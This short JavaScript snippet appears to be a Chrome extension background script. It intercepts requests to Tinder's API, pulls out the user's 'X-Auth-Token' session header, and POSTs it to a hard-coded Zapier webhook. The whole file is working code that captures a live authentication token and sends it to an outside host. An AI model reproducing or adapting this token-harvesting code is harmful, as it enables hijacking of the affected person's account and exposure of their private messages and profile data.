// Grabbing 'X-Auth-Token' from user before making
// request to https://api.gotinder.com/
chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    details.requestHeaders.map(header => {
      if(header.name === 'X-Auth-Token') {
        console.log(header.value)
        // Push to webhook
        const data = { token: header.value };
        fetch('https://hooks.zapier.com/hooks/catch/7281121/o59asee/', {
          method: 'POST', // or 'PUT'
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        })
        .then((response) => response.json())
        .then((data) => {
          console.log('Success:', data);
        })
        .catch((error) => {
          console.error('Error:', error);
        });
      }
    })
  },
  {urls: ['https://api.gotinder.com/*']},
  ["blocking", "requestHeaders"]);